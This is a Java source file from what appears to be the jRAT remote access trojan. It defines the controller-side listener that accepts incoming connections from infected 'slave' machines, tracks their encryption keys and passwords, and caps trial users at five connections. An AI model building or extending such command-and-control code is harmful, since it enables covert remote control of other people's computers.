package io.jrat.client.net;

import io.jrat.client.Main;
import io.jrat.client.Slave;
import io.jrat.client.exceptions.CloseException;
import io.jrat.client.ui.panels.PanelMainLog;
import io.jrat.client.ui.panels.PanelMainSockets;
import io.jrat.common.crypto.EncryptionKey;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;


public class PortListener implements Runnable {

	public static List<PortListener> listeners = new ArrayList<PortListener>();

	private ServerSocket server;
	private int timeout = 15 * 1000;
	private boolean listening = false;
	private EncryptionKey key;
	private String pass;
	private String name;

	public ServerSocket getServer() {
		return server;
	}

	public int getTimeout() {
		return timeout;
	}

	public boolean isListening() {
		return listening;
	}

	public EncryptionKey getKey() {
		return key;
	}

	public String getPass() {
		return pass;
	}

	public String getName() {
		return name;
	}

	public PortListener(String name, int port, int timeout, EncryptionKey key, String pass) throws Exception {
		this.name = name;
		this.timeout = timeout;
		this.server = new ServerSocket(port);
		this.key = key;
		this.pass = pass;
		listeners.add(this);
	}

	@Override
	public void run() {
		try {
			while (!server.isClosed()) {
				Socket socket = server.accept();

				Slave slave = new Slave(this, socket);

				if (Main.trial && Main.connections.size() >= 5) {
					slave.closeSocket(new CloseException("Maximum of 5 connections reached"));
					PanelMainLog.instance.addEntry("Warning", slave, "Maximum of 5 connections reached");
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void start() {
		String keyText = "";
		try {
			keyText = key.getTextualKey();
		} catch (Exception e) {
			e.printStackTrace();
		}
		PanelMainSockets.instance.getModel().addRow(new Object[] { name, server.getLocalPort(), timeout, pass, keyText });

		new Thread(this, "Port " + server.getLocalPort()).start();
	}

	public static PortListener getListener(String name, int port, int timeout, EncryptionKey key, String pass) {
		for (int i = 0; i < listeners.size(); i++) {
			PortListener con = listeners.get(i);
			if (con.name.equals(name) && con.key.equals(key) && con.pass.equals(pass) && con.getServer().getLocalPort() == port && con.getTimeout() == timeout) {
				return con;
			}
		}

		return null;
	}

	public static PortListener getListener(String name) {
		for (int i = 0; i < listeners.size(); i++) {
			PortListener con = listeners.get(i);
			if (con.name.equals(name)) {
				return con;
			}
		}

		return null;
	}

}
